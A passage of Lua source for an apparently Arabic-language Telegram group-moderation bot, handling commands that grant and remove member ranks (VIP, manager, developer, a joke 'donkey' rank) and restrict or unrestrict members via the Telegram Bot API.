if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is now a VIP member all ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( مميز عام ) سابقا*', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ has been a VIP member all ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( مميز عام ) بنجاح*', 1, 'md')
end
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promoteall_by_reply)
end
----------------------------------------DevProx-------------------------------------------------------
if text:match("^[Ss]etvipall @(.*)$") then
local ap = {string.match(text, "^([Ss]etvipall) @(.*)$")}
function promoteall_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ promoted to VIP member all ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ العضو ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم رفعه ( مميز عام ) بنجاح'
end
DevAbs:sadd(DevProx..'bot:vpall:', result.id_)
else
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],promoteall_by_username)
end
-------------------------------DevProx----------------------------------------------------------------
if text:match("^[Ss]etvipall (%d+)$") then
local ap = {string.match(text, "^([Ss]etvipall) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..ap[2]..' ، 🚷\n🚸┇ has been a VIP member all✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم رفعه ( مميز عام ) بنجاح*', 1, 'md')
end
end
DevAbs:sadd(DevProx..'bot:vpall:', ap[2])
end
-------------------------------------DevProx----------------------------------------------------------
local text = msg.content_.text_:gsub('تنزيل مميز عام','demdonky')
if text:match("^[Dd]emvipall$") and msg.reply_to_message_id_ ~= 0 then
function demoteall_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:vpall:'
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is not a VIP member all ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *لم يتم رفعه ( مميز عام ) سابقا*', 1, 'md')
end
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The vip ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ was removed from VIP member all ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *المميز العام* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله ( عضو اعتيادي ) *', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demoteall_by_reply)
end
-----------------------------------------DevProx------------------------------------------------------
if text:match("^[Dd]emvipall @(.*)$") then
local abs = 'bot:vpall:'
local ap = {string.match(text, "^([Dd]emvipall) @(.*)$")}
function demoteall_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*⏱┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ was demoted from VIP member all✅ \nֆ                 ֆ*'
else
texts = '🏆┇ المميز العام ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم تنزيله ( عضو اعتيادي ) '
end
DevAbs:srem(DevProx..abs, result.id_)
else
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],demoteall_by_username)
end
--------------------------------DevProx---------------------------------------------------------------
if text:match("^[Dd]emvipall (%d+)$") then
local abs = 'bot:vpall:'
local ap = {string.match(text, "^([Dd]emvipall) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*⏱┇ The vip all ؛ '..ap[2]..' ، ⏱\n🚸┇ was removed from VIP member all✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *المميز العام* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم تنزيله ( عضو اعتيادي ) بنجاح*', 1, 'md')
end
DevAbs:srem(DevProx..abs, ap[2])
end
end
end
------------------------------------------DevProx-----------------------------------------------------
if msg.reply_to_message_id_ ~= 0  then
if text:match("^رفع مطي$") then
function donky_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:donky:'..msg.chat_id_
if DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is now a donky ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * ( هو مطي شرفع منه بعد 😔😹 ) *', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ User ؛ '..result.sender_user_id_..' ، ⏱\n🚸┇ has been a Full donky  😂💔\nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم رفعه ( مطي  🐴 ) *', 1, 'md')
end
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end
end
----------------------------------------DevProx-------------------------------------------------------
if msg.reply_to_message_id_ ~= 0  then
if text:match("^تنزيل مطي$") then
function donky_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:donky:'..msg.chat_id_
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is not a donky ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * ( لم يتم رفعه مطي ) *', 1, 'md')
end
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The vip ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ was removed from donky list \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *المطي* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * ( يبقه مطي بس حنزله لخاطرك 😔😹 ) *', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end
end
----------------------------------------------DevProx-------------------------------------------------
if is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
local text = msg.content_.text_:gsub('رفع مدير','رفع مدير')
if text:match("^رفع مدير$") then
function owner_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:owners:'..msg.chat_id_
if DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is now owner bot ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم رفعه ( مدير ) سابقا *', 1, 'md')
end
else
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*⏱┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ has been owner bot ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم رفعه ( مدير ) بنجاح *', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,owner_by_reply)
end
--------------------------------------------DevProx---------------------------------------------------
if text and text:match("^رفع مدير @(.*)$") then
local ap = {string.match(text, "^(رفع مدير) @(.*)$")}
function setowner_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
DevAbs:sadd(DevProx..'bot:owners:'..msg.chat_id_, result.id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ added to owner list ✅ \nֆ                 ֆ*'
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم رفعه ( مدير ) سابقا *', 1, 'md')
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end  end  end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],setowner_by_username)
end
--------------------------------------DevProx---------------------------------------------------------
if text:match("^رفع مدير (%d+)$") then
local ap = {string.match(text, "^(رفع مدير) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
DevAbs:sadd(DevProx..'bot:owners:'..msg.chat_id_, ap[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..ap[2]..' ، 🚷\n🚸┇ has been onwer ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم رفعه ( مدير ) بنجاح *', 1, 'md')
end end end
----------------------------------------DevProx-------------------------------------------------------
local text = msg.content_.text_:gsub('تنزيل مدير','Demowner')
if text:match("^[Dd]emowner$") then
function deowner_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:owners:'..msg.chat_id_
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is not a owner ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * لم يتم رفعه ( مدير ) سابقا *', 1, 'md')
end
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The Owner ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ removed from owner list ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *المدير* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم تنزيله ( عضو ) بنجاح *', 1, 'md')
end end end end          
getMessage(msg.chat_id_, msg.reply_to_message_id_,deowner_by_reply)
end
----------------------------------------DevProx-------------------------------------------------------
if text:match("^[Dd]emowner @(.*)$") then
local abs = 'bot:owners:'..msg.chat_id_
local ap = {string.match(text, "^([Dd]emowner) @(.*)$")}
function remowner_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
DevAbs:srem(DevProx..abs, result.id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The Owner ؛ '..result.id_..' ، 🚷\n🚸┇ removed from owner list ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ المدير ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم تنزيله ( عضو) '
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end end end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],remowner_by_username)
end
----------------------------------------------DevProx-------------------------------------------------
if text:match("^[Dd]emowner (%d+)$") then
local abs = 'bot:owners:'..msg.chat_id_
local ap = {string.match(text, "^([Dd]emowner) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
DevAbs:srem(DevProx..abs, ap[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The Owner ؛ '..ap[2]..' ، 🚷\n🚸┇ removed from owner list ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *المدير* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم تنزيله ( عضو ) بنجاح *', 1, 'md')
end end end end
----------------------------------------------DevProx-------------------------------------------------
if is_sudo(msg) and msg.reply_to_message_id_ ~= 0 then
if text:match("^رفع مطور رتبه ثالثه$") then
function addadmin_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:admins:'
if DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is now Dev therd bot ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم رفعه ( مطور ثالث ) سابقا *', 1, 'md')
end
else
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ has been Dev therd bot ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم رفعه ( مطور رتبه ثالثه ) *', 1, 'md')
end end end end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,addadmin_by_reply)
end
-----------------------------------------------------------------------------------------------
if text:match("^رفع مطور رتبه ثالثه @(.*)$")  and is_sudo(msg) then 
local ap = {string.match(text, "^(رفع مطور رتبه ثالثه) @(.*)$")}
function addadmin_by_username(extra, result, success)
local abs = 'bot:admins:'
if result.id_ then 
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ للمطور الاساسي والثانوي فقط ', 1, 'md')
else
if DevAbs:sismember(DevProx..abs, result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ العضو ( [@'..ap[2]..'] )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ هو بالفعل ( مطور رتبه ثالثه ) ', 1, 'md')
else
DevAbs:sadd(DevProx..abs, result.id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ العضو ( [@'..ap[2]..'] )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم رفعه ( مطور رتبه ثالثه ) ', 1, 'md')
end
end
end
end
resolve_username(ap[2],addadmin_by_username)
end
----------------------------------------DevProx-------------------------------------------------------
if text:match("^رفع مطور رتبه ثالثه (%d+)$") then
local ap = {string.match(text, "^(رفع مطور رتبه ثالثه) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..ap[2]..' ، 🚷\n🚸┇ has been Dev therd bot ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم رفعه ( مطور رتبه ثالثه ) *', 1, 'md')
end
DevAbs:sadd(DevProx..'bot:admins:', ap[2])
end
end
----------------------------------------DevProx-------------------------------------------------------
if msg.reply_to_message_id_ ~= 0 then
if text:match("^تنزيل مطور رتبه ثالثه$") then
function deadmin_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
local abs = 'bot:admins:'
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ is not Dev therd bot ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * لم يتم رفعه ( مطور ) سابقا *', 1, 'md')
end
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ removed from Dev therd bot ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *المطور الثالث* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم تنزيله ( عضو ) بنجاح *', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,deadmin_by_reply)
end
end
-------------------------------------------DevProx----------------------------------------------------
if text:match("^تنزيل مطور رتبه ثالثه @(.*)$") then
local abs = 'bot:admins:'
local ap = {string.match(text, "^([Rr]emdev3) @(.*)$")}
function remadmin_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
DevAbs:srem(DevProx..abs, result.id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ removed from Dev therd bot ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ المطور الثالث ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم تنزيله ( عضو ) '
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*📤┇ Username is not correct *'
else
texts = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],remadmin_by_username)
end
-------------------------------------DevProx----------------------------------------------------------
if text:match("^تنزيل مطور رتبه ثالثه (%d+)$") then
local abs = 'bot:admins:'
local ap = {string.match(text, "^([Rr]emdev3) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
DevAbs:srem(DevProx..abs, ap[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The User ؛ '..ap[2]..' ، 🚷\n🚸┇ removed from Dev therd bot ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *المطور الثالث* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم تنزيله ( عضو ) بنجاح *', 1, 'md')
end
end
end
end
-----------
if is_momod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then  
if text:match("^تقييد$") then  
function mute_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لا تستطيع تقييدي ', 1, 'md')
return false 
end 
if is_momod(result.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *لا تستطيع تقييد* ( ['..DevProx_res..'] )\n📤┇ *لانه يمتلك احدى الرتب ↓↓*\n*🚸┇ ( مميز - ادمن - مدير - منشئ - مطور )*', 1, 'md')
else 
HTTPS.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.."")
DevAbs:sadd(DevProx..'tkeed:'..msg.chat_id_, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم  ( تقييده ) بنجاح*', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
----------DevProx 
if msg.reply_to_message_id_ ~= 0 then  
if text:match("^الغاء تقييد$") then
function mute_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'هاذا البوت', 1, 'md')  
return false 
end 
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ *تم  ( الغاء تقييده ) بنجاح*', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
end 
end
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^المقيدين$") then 
local abs =  'tkeed:'..msg.chat_id_
local list = DevAbs:smembers(DevProx..abs)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of baneed  \n\n"
else
text = "📤┇ قائمه المقيدين ↓↓ \n\n"
end
for k,v in pairs(list) do
local user_info = DevAbs:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." ~  ┇ @"..username.." ["..v.."]\n"
else
text = text..k.." ~  ┇ "..v.."\n"
end
end
if #list == 0 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of baeed is empty "
else
text = "📛┇ لا يوجد المقيدين "
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
if text == 'حذف المقيدين' and is_momod(msg.sender_user_id_, msg.chat_id_) then     
local abs =  'tkeed:'..msg.chat_id_
local list = DevAbs:smembers(DevProx..abs)
for k,v in pairs(list) do   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..v.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_, v)
end 
Dev_Abs(msg.chat_id_, msg.id_, 1,'📤┇ تم حذف المقيدين ', 1, 'md')
 end
